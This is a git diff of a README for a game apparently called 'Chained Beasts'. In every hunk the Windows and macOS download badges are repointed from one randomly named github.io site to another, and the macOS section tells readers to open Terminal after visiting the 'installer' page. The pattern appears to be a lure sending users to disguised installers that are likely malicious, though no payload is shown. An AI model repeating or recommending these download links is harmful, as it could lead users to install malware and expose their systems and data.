@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download Chained Beasts](https://img.shields.io/badge/⬇_Download_Chained%20Beasts-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Download Chained Beasts](https://img.shields.io/badge/⬇_Download_Chained%20Beasts-E63946?style=for-the-badge&logo=github)](https://packgiverchopper3.github.io/winsetup/)
 
 </div>
 
@@ -61,9 +61,9 @@ Chained Beasts is a dark action RPG where you capture and chain powerful monster
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://packgiverchopper3.github.io/winsetup/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://packgiverchopper3.github.io/macsetup/)
 
 </div>
 
@@ -81,7 +81,7 @@ Chained Beasts is a dark action RPG where you capture and chain powerful monster
 
 <div align="center">
 
-[![⬇ Download Chained Beasts](https://img.shields.io/badge/⬇_Download_Chained%20Beasts-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Download Chained Beasts](https://img.shields.io/badge/⬇_Download_Chained%20Beasts-E63946?style=for-the-badge&logo=github)](https://packgiverchopper3.github.io/winsetup/)
 
 </div>
 
@@ -113,7 +113,7 @@ Chained Beasts is a dark action RPG where you capture and chain powerful monster
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://packgiverchopper3.github.io/macsetup/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -138,7 +138,7 @@ Chained Beasts is a dark action RPG where you capture and chain powerful monster
 
 <div align="center">
 
-[![⬇ Download Chained Beasts](https://img.shields.io/badge/⬇_Download_Chained%20Beasts-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Download Chained Beasts](https://img.shields.io/badge/⬇_Download_Chained%20Beasts-E63946?style=for-the-badge&logo=github)](https://packgiverchopper3.github.io/winsetup/)
 
 </div>
 
